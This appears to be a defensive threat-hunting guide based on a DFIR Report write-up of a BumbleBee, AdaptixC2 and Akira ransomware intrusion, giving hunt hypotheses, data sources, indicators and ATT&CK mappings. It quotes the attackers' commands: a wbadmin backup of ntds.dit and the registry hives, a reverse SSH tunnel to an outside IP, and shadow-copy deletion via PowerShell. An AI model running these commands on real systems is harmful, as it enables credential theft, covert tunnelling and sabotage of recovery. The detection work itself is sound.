# Intel Hunt: From Bing Search to Ransomware — BumbleBee, AdaptixC2, and Akira

## Source

This hunt is based on the following DFIR Report:
[From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/)

Published: June 29, 2026 | Reported by: The DFIR Report

---

## Overview

In July 2025, a threat actor leveraged SEO poisoning via Bing to deliver a trojanized MSI installer impersonating ManageEngine OpManager. The installer deployed BumbleBee malware via DLL sideloading, which subsequently dropped an AdaptixC2 beacon for post-exploitation activity. The intrusion culminated in Akira ransomware deployment approximately 44 hours after initial access, with over 75GB of data exfiltrated prior to encryption.

This hunt focuses on identifying behavioral indicators associated with this intrusion across the full attack chain — from initial execution through persistence, credential access, lateral movement, and exfiltration.

---

## Hunt Hypothesis

If this threat actor or a similar campaign has impacted our environment, evidence should be observable across process execution telemetry, network connections, and Windows event logs.

Potential indicators may include:

- Windows binaries executing from non-standard paths such as %TEMP% or %APPDATA%
- NTDS.dit extraction via wbadmin.exe
- Reverse SSH tunnel established with the -R flag
- FileZilla SFTP connections to external infrastructure
- Shadow copy deletion via WMI and PowerShell
- DNS queries to BumbleBee DGA-generated domains
- Network connections to known campaign infrastructure

---

## Data Sources

This hunt may require visibility into the following telemetry sources:

- Windows Event Logs (Security, System)
- Endpoint process creation logs
- Command-line argument logging
- DNS query logs
- Network connection telemetry
- PowerShell Script Block Logging (Event ID 4104)

---

## Hunt Technique 1: Windows Binary Executing from Non-Standard Path (DLL Sideloading)

BumbleBee was loaded via DLL sideloading by placing a malicious `msimg32.dll` alongside a legitimate `consent.exe` in `%TEMP%\ApplicationInstallationFolder_11`. When `consent.exe` executed, it loaded the local malicious DLL instead of the legitimate System32 version.

Hunt for legitimate Windows binaries executing from non-standard locations such as %TEMP%, %APPDATA%, or user-writable directories.

Specific binaries of interest from this report:

- `consent.exe` executing outside of `C:\Windows\System32\`
- `WAB.exe` or renamed variants executing from `%APPDATA%`

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 2: NTDS.dit Extraction via wbadmin.exe

The threat actor used the native Windows `wbadmin.exe` utility to create a backup containing `ntds.dit`, the SYSTEM hive, and the SECURITY hive — providing all components necessary for offline credential extraction.

Hunt for wbadmin.exe invocations referencing ntds.dit or the SYSTEM registry hive.

Command observed in this intrusion:

```
wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet
```

Search for wbadmin.exe process creation events where the command line contains `ntds.dit` or `start backup`.

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 3: Reverse SSH Tunnel Established with -R Flag

The threat actor used the built-in Windows SSH client to establish a reverse tunnel to external infrastructure, proxying RDP traffic through the encrypted channel to bypass firewall restrictions.

Command observed:

```
ssh user@193.242.184[.]150 -R *:10400 -p22
```

Hunt for ssh.exe process creation events where the command line contains the `-R` flag indicating a reverse port forward.

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 4: Shadow Copy Deletion via WMI and PowerShell

Akira ransomware automated the deletion of Volume Shadow Copies upon execution using WMI to invoke a PowerShell command. This was observed on every impacted host within approximately one second of ransomware execution.

Command observed:

```
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
```

Hunt for PowerShell process creation events containing `Win32_Shadowcopy` and `Remove-WmiObject`.

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 5: FileZilla SFTP Exfiltration

The threat actor installed FileZilla and used it to exfiltrate over 75GB of data via SFTP to an external server. The FileZilla installer was dropped via RDP clipboard and executed from `C:\ProgramData\`.

Hunt for FileZilla installer execution from ProgramData and outbound SFTP connections on port 22.

Specific indicators from this report:

- `FileZilla_3.68.1_win64_sponsored2-setup.exe` executed from `C:\ProgramData\`
- Outbound connections to `185.174.100[.]203` on port 22

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 6: BumbleBee DGA Domain Queries

BumbleBee malware generates domain names using a Domain Generation Algorithm (DGA) to establish C2 communication. Wave 2 of this campaign used 14-character `.org` domains.

Hunt for DNS queries to the known BumbleBee domains associated with this campaign.

Known BumbleBee domains from this report:

- `ev2sirbd269o5j[.]org`
- `2rxyt9urhq0bgj[.]org`
- `d1hmxkpwby0d4s[.]org`
- `yj6jurm5qqkye5[.]org`
- `ewujsfb1dp5ran[.]org`
- `8doj8uvx604eck[.]org`
- `kwywztxoo2xdot[.]org`
- `ky1d1p1daahe5t[.]org`
- `ovh1kn1tcqw5kp[.]org`
- `6cimu4mc085em8[.]org`
- `5ka8rxp6t6eup2[.]org`
- `ks501oz9nm3v05[.]org`
- `v5rjsdqogstopr[.]org`

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Hunt Technique 7: Known Campaign IP Indicators

Hunt for network connections to IP addresses associated with this campaign.

Known IPs from this report:

- `192.121.22.94` — BumbleBee C2
- `109.205.195.211` — BumbleBee C2
- `188.40.187.145` — BumbleBee C2
- `171.22.183.43` — BumbleBee C2
- `194.127.178.21` — BumbleBee C2
- `172.96.137.160` — AdaptixC2
- `193.242.184.150` — Reverse SSH Tunnel
- `185.174.100.203` — Exfiltration Server

NOTE: Field names may need to be adjusted based on your log source and SIEM configuration.

---

## Investigation Considerations

If any of the above indicators are identified, investigators should consider the following:

- Is the affected host a server, domain controller, or administrative workstation? This campaign specifically targeted IT administrators and high-value systems.
- Are there signs of lateral movement via RDP to domain controllers or backup servers following the initial indicator?
- Has any new domain account been created with a naming convention that mimics legitimate administrative accounts?
- Is there evidence of data staging in C:\ProgramData\ prior to any exfiltration activity?
- Have any Volume Shadow Copies been deleted in close proximity to other suspicious activity?

---

## A Note on IOC Fidelity

Indicators of compromise such as IP addresses and domains have a limited shelf life and should be treated with caution. Threat actors frequently rotate infrastructure, and IOCs that were high confidence at the time of reporting may no longer be reliable indicators of malicious activity weeks or months later. The behavioral detections in this hunt document are intended to remain relevant over time, but any IOC based searches should be validated against current threat intelligence before being used for alerting. Always check the publication date of the source report when assessing the relevance of specific indicators.

---

## MITRE ATT&CK Mapping

- **T1574.001** — DLL Side-Loading
- **T1003.003** — OS Credential Dumping: NTDS
- **T1572** — Protocol Tunneling
- **T1490** — Inhibit System Recovery
- **T1048.001** — Exfiltration Over Symmetric Encrypted Non-C2 Protocol
- **T1568.002** — Dynamic Resolution: Domain Generation Algorithms

---

## Related Source

[From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira — The DFIR Report](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/)
